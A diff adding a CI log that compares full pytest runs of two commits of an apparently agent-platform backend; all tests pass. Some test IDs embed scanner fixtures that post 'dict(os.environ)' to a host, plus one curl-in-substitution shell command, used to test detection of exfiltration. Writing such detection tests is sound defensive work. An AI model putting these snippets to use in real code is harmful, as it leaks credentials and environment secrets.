@@ -1,0 +1,394 @@
+Runtime lock retention full-suite comparison
+============================================
+main_sha=683d146a30411a743bf314866678f1bdae3944e6
+candidate_sha=c875d670913d1d08e42d84b2963f15f0dec3f774
+main_rc=0
+candidate_rc=0
+
+[main failure lines]
+<none>
+
+[candidate failure lines]
+<none>
+
+[main summary lines]
+tests/test_acceptance_checks.py::TestTestsPassedLeaf::test_zero_passing_tests_is_not_a_pass[0 passed in 1.0s] PASSED [  1%]
+tests/test_sandbox_audit_middleware.py::TestClassifyCommand::test_value_position_substitution_classified_as_pass[for i in $(curl -s https://example.com/list); do echo $i; done] PASSED [ 67%]
+tests/test_skillscan_native.py::test_python_branch_bodies_are_walked_without_leaking_bindings[-import os\nimport requests\n\ns = requests.Session()\nfor _ in [1]:\n    s.post(host, json=dict(os.environ))\n-receivers2-True] PASSED [ 79%]
+tests/test_skillscan_native.py::test_python_declared_false_negatives_stay_unreported[import os\nimport requests\n\ns = config\nlist((s := requests.Session()) for _ in [1])\ns.post(host, json=dict(os.environ))\n] PASSED [ 79%]
+tests/test_skillscan_native.py::test_python_declared_false_negatives_stay_unreported[import os\nimport requests\n\nsession = requests.Session()\n[session.post(host, json=dict(os.environ)) for _ in [1]]\n] PASSED [ 79%]
+tests/test_web_fetch_error_shell_meta.py::test_document_content_stays_successful[# HTTP Status Codes\n\nThe most common client errors are:\n\nNot Found\n\nForbidden\n\nToo Many Requests\n\nAll are defined in RFC 9110.] PASSED [ 98%]
+=== 13846 passed, 36 skipped, 2 deselected, 19 warnings in 926.53s (0:15:26) ===
+
+[candidate summary lines]
+tests/test_acceptance_checks.py::TestTestsPassedLeaf::test_zero_passing_tests_is_not_a_pass[0 passed in 1.0s] PASSED [  1%]
+tests/test_sandbox_audit_middleware.py::TestClassifyCommand::test_value_position_substitution_classified_as_pass[for i in $(curl -s https://example.com/list); do echo $i; done] PASSED [ 67%]
+tests/test_skillscan_native.py::test_python_branch_bodies_are_walked_without_leaking_bindings[-import os\nimport requests\n\ns = requests.Session()\nfor _ in [1]:\n    s.post(host, json=dict(os.environ))\n-receivers2-True] PASSED [ 79%]
+tests/test_skillscan_native.py::test_python_declared_false_negatives_stay_unreported[import os\nimport requests\n\ns = config\nlist((s := requests.Session()) for _ in [1])\ns.post(host, json=dict(os.environ))\n] PASSED [ 79%]
+tests/test_skillscan_native.py::test_python_declared_false_negatives_stay_unreported[import os\nimport requests\n\nsession = requests.Session()\n[session.post(host, json=dict(os.environ)) for _ in [1]]\n] PASSED [ 79%]
+tests/test_web_fetch_error_shell_meta.py::test_document_content_stays_successful[# HTTP Status Codes\n\nThe most common client errors are:\n\nNot Found\n\nForbidden\n\nToo Many Requests\n\nAll are defined in RFC 9110.] PASSED [ 98%]
+=== 13852 passed, 36 skipped, 2 deselected, 19 warnings in 444.84s (0:07:24) ===
+
+[main tail]
+tests/test_wechat_channel.py::test_send_uses_cached_context_token PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_skips_when_context_token_missing PASSED [ 99%]
+tests/test_wechat_channel.py::test_protocol_helpers_build_expected_values PASSED [ 99%]
+tests/test_wechat_channel.py::test_aes_roundtrip_encrypts_and_decrypts PASSED [ 99%]
+tests/test_wechat_channel.py::test_build_upload_request_supports_no_need_thumb PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_uploads_and_sends_image PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_returns_false_without_upload_full_url PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_prefers_cdn_response_header_for_image PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_skips_non_image PASSED      [ 99%]
+tests/test_wechat_channel.py::test_send_file_uploads_and_sends_regular_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_regular_file_uses_cdn_upload_fallback_when_upload_full_url_missing PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_image_uses_post_even_when_upload_full_url_present PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_blocks_disallowed_regular_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_media_aeskey_hex PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_unpadded_item_aes_key PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_media_aes_key_base64_of_hex PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_skips_disallowed_inbound_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_poll_loop_updates_server_timeout PASSED [ 99%]
+tests/test_wechat_channel.py::test_poll_loop_one_bad_message_does_not_permanently_lose_its_siblings PASSED [ 99%]
+tests/test_wechat_channel.py::test_state_cursor_is_loaded_from_disk PASSED [ 99%]
+tests/test_wechat_channel.py::test_auth_state_is_loaded_from_disk PASSED [ 99%]
+tests/test_wechat_channel.py::test_qrcode_login_binds_and_persists_auth_state PASSED [ 99%]
+tests/test_wechat_channel.py::test_save_auth_state_tightens_preexisting_loose_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_save_auth_state_chmod_failure_is_logged_not_warned PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_text_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_content_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_text_with_null_quote_still_publishes PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_text_and_valid_quote_are_combined PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_injects_langfuse_metadata PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_uses_context_user_id_over_contextvar PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_falls_back_to_default_user_when_unset PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_preserves_caller_metadata_overrides PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_overwrites_caller_supplied_trace_id PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_skips_metadata_when_langfuse_disabled PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_root_frame_with_subgraphs_has_empty_namespace PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_subgraph_frame_preserves_namespace PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_nested_subgraph_namespace_is_preserved_in_order PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_two_tuple_under_subgraphs_is_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_without_subgraphs_frames_are_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_single_mode_fallback_is_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_unparsable_item_under_subgraphs PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_root_frame_keeps_bare_event_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_subgraph_frame_gets_namespace_qualified_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_nested_namespace_joins_all_segments PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subagent_values_snapshot_is_never_published_as_bare_values PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_values_snapshot_keeps_bare_event_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subagent_message_chunks_are_namespaced PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_custom_event_is_persisted_for_subagent_history PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subgraph_custom_event_is_not_persisted PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_only_root_frames_drive_the_file_tool_batcher PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_message_chunks_go_through_the_batcher PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_stream_subgraphs_publishes_delegated_frames_namespaced_never_bare PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_delegated_error_fallback_does_not_mark_the_parent_run_as_error PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_without_stream_subgraphs_delegated_frames_stay_out_while_task_events_remain PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_root_values_frame_stamps_a_persisted_message PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_message_not_in_the_feed_is_left_unstamped PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_subgraph_frames_are_not_stamped PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_no_stamper_publishes_the_frame_unchanged PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_resolved_identity_is_not_looked_up_twice PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_miss_is_retried_once_the_feed_advances PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_miss_is_not_retried_while_the_feed_is_unchanged PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_failed_lookup_is_retried_once_the_feed_advances PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_resolved_identity_survives_a_feed_advance PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_the_run_stamper_re_asks_after_the_journal_writes PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_run_without_a_journal_still_builds_a_stamper PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_stamping_survives_a_launch_path_without_user_context PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_worker_imports_first_without_circular_import PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_steps_are_buffered_not_put_per_event PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_flush_is_idempotent_when_empty PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_terminal_event_flushes_eagerly PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_size_threshold_triggers_flush PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_skips_non_task_chunk PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_missing_store_is_noop PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_store_errors_do_not_propagate PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_flush_rebuffers_batch_on_store_failure PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_rebuffered_batch_is_prepended_ahead_of_new_events PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_roundtrip_step_is_listable_but_not_in_message_feed PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_runtime_context_and_metadata_carry_the_bound_trace_id PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_caller_supplied_metadata_trace_id_is_overwritten PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_caller_supplied_context_trace_id_is_overwritten PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_both_forks_agree_when_the_caller_forges_both PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_run_without_an_ambient_trace_still_gets_one PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_build_runtime_context_drops_a_caller_supplied_trace_id PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reports_text_file_changes PASSED [ 99%]
+tests/test_workspace_changes.py::test_get_changed_output_paths_returns_only_created_or_modified_regular_outputs PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_treats_utf16_markdown_as_text PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reads_cached_utf16_markdown_baseline PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_treats_utf8_markdown_crossing_sample_boundary_as_text PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_strips_utf8_bom PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_keeps_nul_bytes_classified_as_binary PASSED [ 99%]
+tests/test_workspace_changes.py::test_count_diff_lines_ignores_only_real_headers PASSED [ 99%]
+tests/test_workspace_changes.py::test_count_diff_lines_counts_content_starting_with_dashes_or_pluses PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_excluded_directories PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_stdio_mcp_temp_files PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_browser_frames PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_externalized_tool_results PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_extra_excluded_dir_names PASSED [ 99%]
+tests/test_workspace_changes.py::test_get_changed_output_paths_ignores_externalized_tool_results PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_can_skip_text_loading PASSED [ 99%]
+tests/test_workspace_changes.py::test_sensitive_workspace_path_covers_common_secret_names PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_hides_sensitive_and_binary_file_content PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_classifies_symlink_replacing_file_as_symlink_created PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_captures_symlinks_as_metadata_only_stubs PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reports_removed_symlink_without_replacement_as_deleted PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_truncates_large_text_diffs PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_response_returns_summary_only_and_full_payload PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_response_is_empty_when_no_event_exists PASSED [ 99%]
+tests/test_workspace_changes.py::test_run_agent_records_workspace_changes_event[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_record_workspace_changes_content_uses_total_changed_count[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_record_workspace_changes_uses_cached_baseline_for_modified_diff[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_route_forwards_include_files_flag[asyncio] PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_below_cap_succeeds PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_above_cap_returns_actionable_error PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_above_cap_with_append_true_bypasses_guard PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_raises_cap PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_zero_disables_guard PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_malformed_falls_back_to_default PASSED [100%]
+
+=============================== warnings summary ===============================
+.venv/lib/python3.12/site-packages/fastapi/testclient.py:1
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/fastapi/testclient.py:1: StarletteDeprecationWarning: Using `httpx` with `starlette.testclient` is deprecated; install `httpx2` instead.
+    from starlette.testclient import TestClient as TestClient  # noqa
+
+tests/test_auth_errors.py::test_decode_token_returns_token_error_on_bad_signature
+tests/test_auth_type_system.py::test_get_current_user_invalid_token_returns_token_invalid
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 12 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
+    return self._jws.encode(
+
+tests/test_auth_middleware.py::test_auth_disabled_does_not_clobber_valid_session_cookie
+tests/test_initialize_admin.py::test_initialize_accessible_without_cookie
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/starlette/testclient.py:454: DeprecationWarning: Setting per-request cookies=<...> is being deprecated, because the expected behaviour on cookie persistence is ambiguous. Set cookies directly on the client instance instead.
+    return super().request(
+
+tests/test_auth_type_system.py::test_decode_token_invalid_sig_maps_to_token_invalid_code
+tests/test_auth_type_system.py::test_api_auth_me_invalid_sig_returns_structured_401
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 9 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
+    return self._jws.encode(
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/lark_oapi/ws/pb/google/protobuf/internal/well_known_types.py:91: DeprecationWarning: datetime.datetime.utcfromtimestamp() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.fromtimestamp(timestamp, datetime.UTC).
+    _EPOCH_DATETIME_NAIVE = datetime.datetime.utcfromtimestamp(0)
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/lark_oapi/ws/client.py:67: DeprecationWarning: websockets.InvalidStatusCode is deprecated
+    def _parse_ws_conn_exception(e: websockets.InvalidStatusCode):
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/websockets/legacy/__init__.py:6: DeprecationWarning: websockets.legacy is deprecated; see https://websockets.readthedocs.io/en/stable/howto/upgrade.html for upgrade instructions
+    warnings.warn(  # deprecated in 14.0 - 2024-11-09
+
+tests/test_channels.py::TestWeComChannel::test_on_outbound_sends_attachment_before_clearing_context
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/aibot/ws.py:28: DeprecationWarning: websockets.client.WebSocketClientProtocol is deprecated
+    from websockets.client import WebSocketClientProtocol
+
+tests/test_extensions_config_atomic_write.py::test_extensions_config_file_lock_serializes_cross_process_read_modify_write
+tests/test_extensions_config_atomic_write.py::test_extensions_config_file_lock_serializes_cross_process_read_modify_write
+tests/test_lark_cli_integration.py::test_concurrent_lark_skill_reinstalls_serialize_across_processes
+tests/test_lark_cli_integration.py::test_concurrent_lark_skill_reinstalls_serialize_across_processes
+  /opt/hostedtoolcache/Python/3.12.14/x64/lib/python3.12/multiprocessing/popen_fork.py:66: DeprecationWarning: This process (pid=3067) is multi-threaded, use of fork() may lead to deadlocks in the child.
+    self.pid = os.fork()
+
+tests/test_model_factory.py::test_unknown_config_key_emits_warning
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/_pytest/python.py:166: UserWarning: WARNING! definitely_not_a_real_kwarg is not default parameter.
+                  definitely_not_a_real_kwarg was transferred to model_kwargs.
+                  Please confirm that definitely_not_a_real_kwarg is what you intended.
+    result = testfunction(**testargs)
+
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/uvicorn/protocols/websockets/websockets_impl.py:17: DeprecationWarning: websockets.server.WebSocketServerProtocol is deprecated
+    from websockets.server import WebSocketServerProtocol
+
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+  /opt/hostedtoolcache/Python/3.12.14/x64/lib/python3.12/contextlib.py:105: DeprecationWarning: Use `streamable_http_client` instead.
+    self.gen = func(*args, **kwds)
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=== 13846 passed, 36 skipped, 2 deselected, 19 warnings in 926.53s (0:15:26) ===
+
+[candidate tail]
+tests/test_wechat_channel.py::test_send_uses_cached_context_token PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_skips_when_context_token_missing PASSED [ 99%]
+tests/test_wechat_channel.py::test_protocol_helpers_build_expected_values PASSED [ 99%]
+tests/test_wechat_channel.py::test_aes_roundtrip_encrypts_and_decrypts PASSED [ 99%]
+tests/test_wechat_channel.py::test_build_upload_request_supports_no_need_thumb PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_uploads_and_sends_image PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_returns_false_without_upload_full_url PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_prefers_cdn_response_header_for_image PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_skips_non_image PASSED      [ 99%]
+tests/test_wechat_channel.py::test_send_file_uploads_and_sends_regular_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_regular_file_uses_cdn_upload_fallback_when_upload_full_url_missing PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_image_uses_post_even_when_upload_full_url_present PASSED [ 99%]
+tests/test_wechat_channel.py::test_send_file_blocks_disallowed_regular_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_media_aeskey_hex PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_unpadded_item_aes_key PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_downloads_inbound_file_with_media_aes_key_base64_of_hex PASSED [ 99%]
+tests/test_wechat_channel.py::test_handle_update_skips_disallowed_inbound_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_poll_loop_updates_server_timeout PASSED [ 99%]
+tests/test_wechat_channel.py::test_poll_loop_one_bad_message_does_not_permanently_lose_its_siblings PASSED [ 99%]
+tests/test_wechat_channel.py::test_state_cursor_is_loaded_from_disk PASSED [ 99%]
+tests/test_wechat_channel.py::test_auth_state_is_loaded_from_disk PASSED [ 99%]
+tests/test_wechat_channel.py::test_qrcode_login_binds_and_persists_auth_state PASSED [ 99%]
+tests/test_wechat_channel.py::test_save_auth_state_tightens_preexisting_loose_file PASSED [ 99%]
+tests/test_wechat_channel.py::test_save_auth_state_chmod_failure_is_logged_not_warned PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_text_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_quote_content_is_null_does_not_crash PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_text_with_null_quote_still_publishes PASSED [ 99%]
+tests/test_wecom_ws_text.py::TestOnWsTextQuoteParsing::test_text_and_valid_quote_are_combined PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_injects_langfuse_metadata PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_uses_context_user_id_over_contextvar PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_falls_back_to_default_user_when_unset PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_preserves_caller_metadata_overrides PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_overwrites_caller_supplied_trace_id PASSED [ 99%]
+tests/test_worker_langfuse_metadata.py::test_run_agent_skips_metadata_when_langfuse_disabled PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_root_frame_with_subgraphs_has_empty_namespace PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_subgraph_frame_preserves_namespace PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_nested_subgraph_namespace_is_preserved_in_order PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_two_tuple_under_subgraphs_is_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_without_subgraphs_frames_are_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_single_mode_fallback_is_root PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestUnpackStreamItem::test_unparsable_item_under_subgraphs PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_root_frame_keeps_bare_event_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_subgraph_frame_gets_namespace_qualified_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestComposeSseEvent::test_nested_namespace_joins_all_segments PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subagent_values_snapshot_is_never_published_as_bare_values PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_values_snapshot_keeps_bare_event_name PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subagent_message_chunks_are_namespaced PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_custom_event_is_persisted_for_subagent_history PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_subgraph_custom_event_is_not_persisted PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_only_root_frames_drive_the_file_tool_batcher PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestPublishStreamItem::test_root_message_chunks_go_through_the_batcher PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_stream_subgraphs_publishes_delegated_frames_namespaced_never_bare PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_delegated_error_fallback_does_not_mark_the_parent_run_as_error PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestWorkerSubgraphStreamIntegration::test_without_stream_subgraphs_delegated_frames_stay_out_while_task_events_remain PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_root_values_frame_stamps_a_persisted_message PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_message_not_in_the_feed_is_left_unstamped PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_subgraph_frames_are_not_stamped PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_no_stamper_publishes_the_frame_unchanged PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_resolved_identity_is_not_looked_up_twice PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_miss_is_retried_once_the_feed_advances PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_miss_is_not_retried_while_the_feed_is_unchanged PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_failed_lookup_is_retried_once_the_feed_advances PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_resolved_identity_survives_a_feed_advance PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_the_run_stamper_re_asks_after_the_journal_writes PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_a_run_without_a_journal_still_builds_a_stamper PASSED [ 99%]
+tests/test_worker_stream_subgraph_namespace.py::TestMessageSeqStamping::test_stamping_survives_a_launch_path_without_user_context PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_worker_imports_first_without_circular_import PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_steps_are_buffered_not_put_per_event PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_flush_is_idempotent_when_empty PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_terminal_event_flushes_eagerly PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_size_threshold_triggers_flush PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_skips_non_task_chunk PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_missing_store_is_noop PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_store_errors_do_not_propagate PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_flush_rebuffers_batch_on_store_failure PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_rebuffered_batch_is_prepended_ahead_of_new_events PASSED [ 99%]
+tests/test_worker_subagent_persistence.py::test_roundtrip_step_is_listable_but_not_in_message_feed PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_runtime_context_and_metadata_carry_the_bound_trace_id PASSED [ 99%]
